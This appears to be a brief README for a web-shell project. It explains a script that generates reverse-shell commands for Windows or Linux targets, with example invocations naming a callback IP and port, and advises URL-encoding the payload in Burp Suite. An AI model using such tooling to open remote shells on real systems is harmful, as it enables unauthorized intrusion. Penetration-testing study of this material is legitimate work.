# Web-Shell
I have made webshell project to make sure safety without evil code 

File `genRevershell.py` is use to generate reverse shell via cmd.
How to use:
1. Use python3 
2. Linux OS

To gen for Windows target is :
`python3 genRevershell.py 192.168.1.6 1234 1`

To gen for Linux target is :
`python3 genRevershell.py 192.168.1.6 1234 2`

![image](https://user-images.githubusercontent.com/24661746/130801741-28663ef1-e8be-4f39-9c42-eaf769750dd6.png)

In real case, we need to encode payload as URL(`Ctrl+U` in Burpsuite):

![image](https://user-images.githubusercontent.com/24661746/130804243-78775658-ed64-4abb-8dd5-e0120314eb71.png)

![image](https://user-images.githubusercontent.com/24661746/130805272-33ffe746-7fd4-49b2-be47-87aa8cdef7dc.png)

